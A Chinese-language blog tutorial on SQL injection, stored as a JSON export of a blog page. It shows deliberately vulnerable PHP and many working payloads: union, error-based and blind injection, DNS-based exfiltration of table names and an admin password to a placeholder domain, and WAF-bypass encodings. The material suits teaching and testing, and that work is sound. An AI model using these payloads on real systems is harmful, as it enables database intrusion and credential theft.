{"name":"深入理解web漏洞","slug":"深入理解web漏洞","count":1,"postlist":[{"title":"深入理解web漏洞之 SQL注入","slug":"深入理解web漏洞之-SQL注入","date":"2019-03-06T16:03:23.000Z","updated":"2019-03-09T00:30:40.148Z","comments":true,"path":"api/articles/深入理解web漏洞之-SQL注入.json","excerpt":"","keywords":null,"cover":"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/深入理解web漏洞/sql_buer_6.png","content":"<h3 id=\"1、什么是-SQL-注入\"><a href=\"#1、什么是-SQL-注入\" class=\"headerlink\" title=\"1、什么是 SQL 注入\"></a>1、什么是 SQL 注入</h3><p><strong>百度百科：</strong><br>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p>\n<p><strong>代码层</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">·</span><br><span class=\"line\">·</span><br><span class=\"line\">·</span><br><span class=\"line\">$id= $_GET[<span class=\"string\">'id'</span>];</span><br><span class=\"line\">$sql = <span class=\"string\">\"SELECT first_name FROM users WHERE user_id = '$id'\"</span>;</span><br><span class=\"line\">$result = mysql_query($sql);</span><br><span class=\"line\">$first = mysql_result($result);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $first;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>参数id正常情况下接收一个数字，可以是1、或2或3。<br>当输入一些其他字符时，比如：<code>-1&#39; union SELECT count(username,password) FROM admin %23</code>,就改变了开发者最初的本意，从数据库返回了不该返回的数据。这就是注入。</p>\n<h3 id=\"2、SQL注入分类\"><a href=\"#2、SQL注入分类\" class=\"headerlink\" title=\"2、SQL注入分类\"></a>2、SQL注入分类</h3><h4 id=\"2-1-回显注入\"><a href=\"#2-1-回显注入\" class=\"headerlink\" title=\"2.1 回显注入\"></a>2.1 回显注入</h4><p>SQL语句的执行结果会返回页面上，这种是最简单的。<br>一般也分两种情况:<br>数字型注入，比如<code>$sql = &quot;SELECT first_name FROM users WHERE user_id = $id&quot;;</code>,参数的位置没有加单引号或者双引号。<br>字符型注入，比如<code>$sql = &quot;SELECT first_name FROM users WHERE user_id = &#39;$id&#39;&quot;;</code>,参数的位置加了单引号，注入的时候就要考虑单引号的闭合。</p>\n<h4 id=\"2-2-报错注入\"><a href=\"#2-2-报错注入\" class=\"headerlink\" title=\"2.2 报错注入\"></a>2.2 报错注入</h4><p>程序将数据库的返回错误信息直接显示在页面中，但是不返回数据库的查询结果，可以构造一些报错语句从错误信息中获取想要的结果。<br>常用的报错函数及语句：<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.floor()</span><br><span class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> <span class=\"keyword\">test</span> <span class=\"keyword\">where</span> <span class=\"keyword\">id</span>=<span class=\"number\">1</span> <span class=\"keyword\">and</span> (<span class=\"keyword\">select</span> <span class=\"number\">1</span> <span class=\"keyword\">from</span> (<span class=\"keyword\">select</span> <span class=\"keyword\">count</span>(*),<span class=\"keyword\">concat</span>(<span class=\"keyword\">user</span>(),<span class=\"keyword\">floor</span>(<span class=\"keyword\">rand</span>(<span class=\"number\">0</span>)*<span class=\"number\">2</span>))x <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">group</span> <span class=\"keyword\">by</span> x)a);</span><br><span class=\"line\"></span><br><span class=\"line\">2.extractvalue()</span><br><span class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> <span class=\"keyword\">test</span> <span class=\"keyword\">where</span> <span class=\"keyword\">id</span>=<span class=\"number\">1</span> <span class=\"keyword\">and</span> (extractvalue(<span class=\"number\">1</span>,<span class=\"keyword\">concat</span>(<span class=\"number\">0x7e</span>,(<span class=\"keyword\">select</span> <span class=\"keyword\">user</span>()),<span class=\"number\">0x7e</span>)));</span><br><span class=\"line\"></span><br><span class=\"line\">3.updatexml()</span><br><span class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> <span class=\"keyword\">test</span> <span class=\"keyword\">where</span> <span class=\"keyword\">id</span>=<span class=\"number\">1</span> <span class=\"keyword\">and</span> (updatexml(<span class=\"number\">1</span>,<span class=\"keyword\">concat</span>(<span class=\"number\">0x7e</span>,(<span class=\"keyword\">select</span> <span class=\"keyword\">user</span>()),<span class=\"number\">0x7e</span>),<span class=\"number\">1</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">4.geometrycollection()</span><br><span class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> <span class=\"keyword\">test</span> <span class=\"keyword\">where</span> <span class=\"keyword\">id</span>=<span class=\"number\">1</span> <span class=\"keyword\">and</span> geometrycollection((<span class=\"keyword\">select</span> * <span class=\"keyword\">from</span>(<span class=\"keyword\">select</span> * <span class=\"keyword\">from</span>(<span class=\"keyword\">select</span> <span class=\"keyword\">user</span>())a)b));</span><br><span class=\"line\"></span><br><span class=\"line\">5.multipoint()</span><br><span class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> <span class=\"keyword\">test</span> <span class=\"keyword\">where</span> <span class=\"keyword\">id</span>=<span class=\"number\">1</span> <span class=\"keyword\">and</span> multipoint((<span class=\"keyword\">select</span> * <span class=\"keyword\">from</span>(<span class=\"keyword\">select</span> * <span class=\"keyword\">from</span>(<span class=\"keyword\">select</span> <span class=\"keyword\">user</span>())a)b));</span><br><span class=\"line\"></span><br><span class=\"line\">6.polygon()</span><br><span class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> <span class=\"keyword\">test</span> <span class=\"keyword\">where</span> <span class=\"keyword\">id</span>=<span class=\"number\">1</span> <span class=\"keyword\">and</span> polygon((<span class=\"keyword\">select</span> * <span class=\"keyword\">from</span>(<span class=\"keyword\">select</span> * <span class=\"keyword\">from</span>(<span class=\"keyword\">select</span> <span class=\"keyword\">user</span>())a)b));</span><br><span class=\"line\"></span><br><span class=\"line\">7.multipolygon()</span><br><span class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> <span class=\"keyword\">test</span> <span class=\"keyword\">where</span> <span class=\"keyword\">id</span>=<span class=\"number\">1</span> <span class=\"keyword\">and</span> multipolygon((<span class=\"keyword\">select</span> * <span class=\"keyword\">from</span>(<span class=\"keyword\">select</span> * <span class=\"keyword\">from</span>(<span class=\"keyword\">select</span> <span class=\"keyword\">user</span>())a)b));</span><br><span class=\"line\"></span><br><span class=\"line\">8.linestring()</span><br><span class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> <span class=\"keyword\">test</span> <span class=\"keyword\">where</span> <span class=\"keyword\">id</span>=<span class=\"number\">1</span> <span class=\"keyword\">and</span> linestring((<span class=\"keyword\">select</span> * <span class=\"keyword\">from</span>(<span class=\"keyword\">select</span> * <span class=\"keyword\">from</span>(<span class=\"keyword\">select</span> <span class=\"keyword\">user</span>())a)b));</span><br><span class=\"line\"></span><br><span class=\"line\">9.multilinestring()</span><br><span class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> <span class=\"keyword\">test</span> <span class=\"keyword\">where</span> <span class=\"keyword\">id</span>=<span class=\"number\">1</span> <span class=\"keyword\">and</span> multilinestring((<span class=\"keyword\">select</span> * <span class=\"keyword\">from</span>(<span class=\"keyword\">select</span> * <span class=\"keyword\">from</span>(<span class=\"keyword\">select</span> <span class=\"keyword\">user</span>())a)b));</span><br><span class=\"line\"></span><br><span class=\"line\">10.exp()</span><br><span class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> <span class=\"keyword\">test</span> <span class=\"keyword\">where</span> <span class=\"keyword\">id</span>=<span class=\"number\">1</span> <span class=\"keyword\">and</span> <span class=\"keyword\">exp</span>(~(<span class=\"keyword\">select</span> * <span class=\"keyword\">from</span>(<span class=\"keyword\">select</span> <span class=\"keyword\">user</span>())a));</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"2-3-盲注\"><a href=\"#2-3-盲注\" class=\"headerlink\" title=\"2.3 盲注\"></a>2.3 盲注</h4><p>错误信息和SQL语句的执行结果都不会显示在页面上。<br>细分的话，还可以分为布尔盲注和时间盲注。<br>SQL语句执行成功和不成功页面会有变化，可以用布尔盲注。（变化不大）<br>SQL语句执行成功不成功页面都没有变化，只能通过构造语句控制响应的时间来注入，成为时间盲注。<br>一般情况下，为了节省时间，可以用Dnslog注入来代替时间盲注。</p>\n<h5 id=\"2-3-1-盲注常用sql函数\"><a href=\"#2-3-1-盲注常用sql函数\" class=\"headerlink\" title=\"2.3.1 盲注常用sql函数\"></a>2.3.1 盲注常用sql函数</h5><p>Length（）函数 返回字符串的长度<br>Substr（）截取字符串<br>Ascii（）返回字符的ascii码<br>sleep(n)：将程序挂起一段时间 n为n秒<br>if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</p>\n<h5 id=\"2-3-2-布尔盲注\"><a href=\"#2-3-2-布尔盲注\" class=\"headerlink\" title=\"2.3.2 布尔盲注\"></a>2.3.2 布尔盲注</h5><p><a href=\"http://www.xss.tv/payload/sql/sql-bool.php?id=\" target=\"_blank\" rel=\"noopener\">http://www.xss.tv/payload/sql/sql-bool.php?id=</a> <code>1 and (length(database()))&gt;6 --+</code><br><img src=\"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/深入理解web漏洞/sql_buer_6.png\" alt=\"长度6\"><br><img src=\"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/深入理解web漏洞/sql_buer_7.png\" alt=\"长度7\"></p>\n<p>上面的语句是通过二分法一次次请求尝试，最终数据库名字长度大于6页面正常，大于7时页面不正常。可以确定数据库名字长度为7个字符。</p>\n<p><a href=\"http://www.xss.tv/payload/sql/sql-bool.php?id=\" target=\"_blank\" rel=\"noopener\">http://www.xss.tv/payload/sql/sql-bool.php?id=</a> <code>1 and (ascii(substr(database(),1,1)))&gt;99 --+</code><br><img src=\"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/深入理解web漏洞/sql_buer_db1_99.png\" alt=\"db_1_99\"><br><img src=\"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/深入理解web漏洞/sql_buer_db1_100.png\" alt=\"db_1_100\"></p>\n<p>同样的二分法，不同的是用了其他函数。上面介绍过函数的作用。payload意思：从数据库名字的第一位截取一位，并转换为ascii值和猜测的值比较。上图确定第一位的ASCII值为100，自行转换为字符即可。数据库名字的后6位依次变换substr()的第二个参数即可。<br>有些情况会过滤掉<code>,</code>这个符号，就不能用substr()这个函数了，可以用mid()来代替。<code>mid((str)from(1)for(1))</code>用法和substr()一样的。</p>\n<p><a href=\"http://www.xss.tv/payload/sql/sql-bool.php?id=1%20and%20(ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),1,1)))%3E50%20--+\" target=\"_blank\" rel=\"noopener\">http://www.xss.tv/payload/sql/sql-bool.php?id=1%20and%20(ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),1,1)))%3E50%20--+</a><br>这是爆破当前库的第一个表的表名，类似上面，后面以此是字段名，不细说了。<br>最后<code>id=1&#39; and (ascii(substr(( select 字段 from 表名 limit 0,1),1,1)))=68 --+</code>爆字段的值。</p>\n<h5 id=\"2-3-3-时间盲注\"><a href=\"#2-3-3-时间盲注\" class=\"headerlink\" title=\"2.3.3 时间盲注\"></a>2.3.3 时间盲注</h5><p><a href=\"http://www.xss.tv/payload/sql/sql-bool.php?id=\" target=\"_blank\" rel=\"noopener\">http://www.xss.tv/payload/sql/sql-bool.php?id=</a> <code>1 and (if(ascii(substr(database(),1,1))&gt;99,sleep(5),0)) --+</code><br>判断条件和上面类似，如果<code>ascii(substr(database(),1,1))&gt;99</code>为<code>True</code>,返回<code>sleep(5)</code>,沉睡5秒再响应页面，否则立即返回。<br>后面爆破表名、字段请自行参照布尔盲注。</p>\n<h5 id=\"2-3-4-Dnslog盲注\"><a href=\"#2-3-4-Dnslog盲注\" class=\"headerlink\" title=\"2.3.4 Dnslog盲注\"></a>2.3.4 Dnslog盲注</h5><p>Dnslog平台搭建：<a href=\"https://github.com/BugScanTeam/DNSLog\" target=\"_blank\" rel=\"noopener\">https://github.com/BugScanTeam/DNSLog</a><br>Dnslog低成本简易：<a href=\"https://www.cnblogs.com/Chorder/p/9087386.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/Chorder/p/9087386.html</a><br>也可以自己在网上找。<br><strong>My Sql过程：</strong><br><a href=\"http://www.xss.tv/payload/sql/sql-bool.php?id=\" target=\"_blank\" rel=\"noopener\">http://www.xss.tv/payload/sql/sql-bool.php?id=</a> <code>1 order by 6 %23</code><br>同样用<code>order by</code>语句的二分法判断字段个数。</p>\n<p><a href=\"http://www.xss.tv/payload/sql/sql-bool.php?id=\" target=\"_blank\" rel=\"noopener\">http://www.xss.tv/payload/sql/sql-bool.php?id=</a> <code>1 union select 1,2,3,4,5,load_file(CONCAT(&#39;\\\\&#39;,(select hex(table_name) from information_schema.tables where table_schema=database() limit 0,1),&#39;.dns.yuming.com&#39;))</code><br>第一个表名，后面的表名依次改变<code>limit 0,n</code>中N的值即可。<br>hex()函数把值转换成16进制，因为dns请求中如果有特殊字符，会出错。之后把dnslog平台的数据在做下转换即可。</p>\n<p><a href=\"http://www.xss.tv/payload/sql/sql-bool.php?id=\" target=\"_blank\" rel=\"noopener\">http://www.xss.tv/payload/sql/sql-bool.php?id=</a> <code>1 union select 1,2,3,4,5,load_file(CONCAT(&#39;\\\\&#39;,(SELECT hex(pass) \nFROM biaoming WHERE name=&#39;admin&#39; LIMIT 0,1),&#39;.dns.yuming.com&#39;))</code><br>根据前两步获得的表名和列名爆破字段值</p>\n<h4 id=\"2-4-按位置分\"><a href=\"#2-4-按位置分\" class=\"headerlink\" title=\"2.4 按位置分\"></a>2.4 按位置分</h4><p>也就是插入payload的位置，一般有post注入、get注入、cookie注入、请求头的各个参数值等。</p>\n<h3 id=\"3、绕过WAF\"><a href=\"#3、绕过WAF\" class=\"headerlink\" title=\"3、绕过WAF\"></a>3、绕过WAF</h3><h4 id=\"3-1-使用大小写绕过，\"><a href=\"#3-1-使用大小写绕过，\" class=\"headerlink\" title=\"3.1 使用大小写绕过，\"></a>3.1 使用大小写绕过，</h4><p>比如：<code>uNiOn SelEct password FrOm users WhErE username=&#39;admin&#39; --</code></p>\n<h4 id=\"3-2-使用SQL注释，\"><a href=\"#3-2-使用SQL注释，\" class=\"headerlink\" title=\"3.2 使用SQL注释，\"></a>3.2 使用SQL注释，</h4><p>比如：<code>/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/**/OM/**/users/**/WHE/**/RE/**/username/**/LIKE/**/&#39;admin&#39; --</code></p>\n<h4 id=\"3-3-使用编码\"><a href=\"#3-3-使用编码\" class=\"headerlink\" title=\"3.3 使用编码\"></a>3.3 使用编码</h4><p>分三种情况<br>1). URL编码：<code>%2f%2a*/UN%2f%2a*/ION%2f%2a*/SEL%2f%2a*/ECT%2f%2a*/password%2f%2a*/FR%2f%2a*/OM%2f%2a*/users%2f%2a*/WHE%2f%2a*/RE%2f%2a*/username%2f%2a*/LIKE%2f%2a*/&#39;admin&#39; --</code><br>2). 双URL编码：<code>%252f%252a*/UN%252f%252a*/ION%252f%252a*/SEL%252f%252a*/ECT%252f%252a*/password%252f%252a*/FR%252f%252a*/OM%252f%252a*/users%252f%252a*/WHE%252f%252a*/RE%252f%252a*/username%252f%252a*/LIKE%252f%252a*/&#39;admin&#39; --</code><br>3). Unicode编码，考虑到Unicode规范的复杂性，解码器通常会容忍非法编码并按照“最接近匹配（closest fit）”原则进行解码<br><img src=\"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/深入理解web漏洞/Unicode编码前后对照表.png\" alt=\"Unicode编码表\"></p>\n<h4 id=\"3-4-动态查询执行\"><a href=\"#3-4-动态查询执行\" class=\"headerlink\" title=\"3.4 动态查询执行\"></a>3.4 动态查询执行</h4><p>1). MSSQL<br>使用EXEC函数执行一个字符串格式的查询。例如：<code>EXEC(&#39;SELECT password FROM users&#39;)</code><br>2). Oracle<br>使用EXECUTE IMMEDIATE命令执行。例如：<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">DECLARE</span> pw VARCHAR2(<span class=\"number\">1000</span>);</span><br><span class=\"line\"><span class=\"keyword\">BEGIN</span></span><br><span class=\"line\">\t<span class=\"keyword\">EXECUTE</span> <span class=\"keyword\">IMMEDIATE</span> <span class=\"string\">'SELECT password FROM users'</span> <span class=\"keyword\">INTO</span> pw;</span><br><span class=\"line\">\tDBMS_OUTPUT.PUT_LINE(pw);</span><br><span class=\"line\"><span class=\"keyword\">END</span>;</span><br></pre></td></tr></table></figure></p>\n<p>3). 字符串连接<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Oracle: &apos;SEL&apos;||&apos;ECT&apos;</span><br><span class=\"line\">MS-SQL: &apos;SEL&apos;+&apos;ECT&apos;</span><br><span class=\"line\">MySQL : &apos;SEL&apos;&apos;ECT&apos;</span><br></pre></td></tr></table></figure></p>\n<p>SQL Server使用“+”（加号）作为连接符。<br>MySQL使用空格作为连接符。<br>在HTTP请求中提交这些字符时，需要在URL中分别将它们编码成<code>%2b</code>和<code>%20</code></p>\n<p>4). 使用CHAR()函数构造单独的字符<br>比如<code>SELECT</code>关键字：CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)</p>\n<h4 id=\"3-5-使用空字节\"><a href=\"#3-5-使用空字节\" class=\"headerlink\" title=\"3.5 使用空字节\"></a>3.5 使用空字节</h4><p>要想执行空字节攻击，只需在过滤器阻止的字符前面提供一个采用URL编码的空字节（%00）即可。<br>比如：<code>%00&#39; UNION SELECT ······=&#39;admin&#39; --</code></p>\n<h4 id=\"3-6-嵌套剥离后的表达式\"><a href=\"#3-6-嵌套剥离后的表达式\" class=\"headerlink\" title=\"3.6 嵌套剥离后的表达式\"></a>3.6 嵌套剥离后的表达式</h4><p>有时候WAF会把关键字替换为空，这时候就可以利用这一特性，<br>比如：<code>SELSELECTECT</code>,中间的<code>SELECT</code>被替换为空时，就剩下了<code>SELECT</code></p>\n<h3 id=\"4、-总结\"><a href=\"#4、-总结\" class=\"headerlink\" title=\"4、 总结\"></a>4、 总结</h3><p>本文主要讲了SQL注入的概念、分类、以及绕WAF，其实都不全面。比如分类里还有没提到的，像二阶SQL注入。再比如绕WAF里没写利用截断、使用非标准入口点等方法。至于SQL注入拿shell，在提权部分会提到。</p>\n","text":"1、什么是 SQL 注入百度百科：<br>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"深入理解web漏洞","slug":"深入理解web漏洞","count":1,"path":"api/tags/深入理解web漏洞.json"}]}]}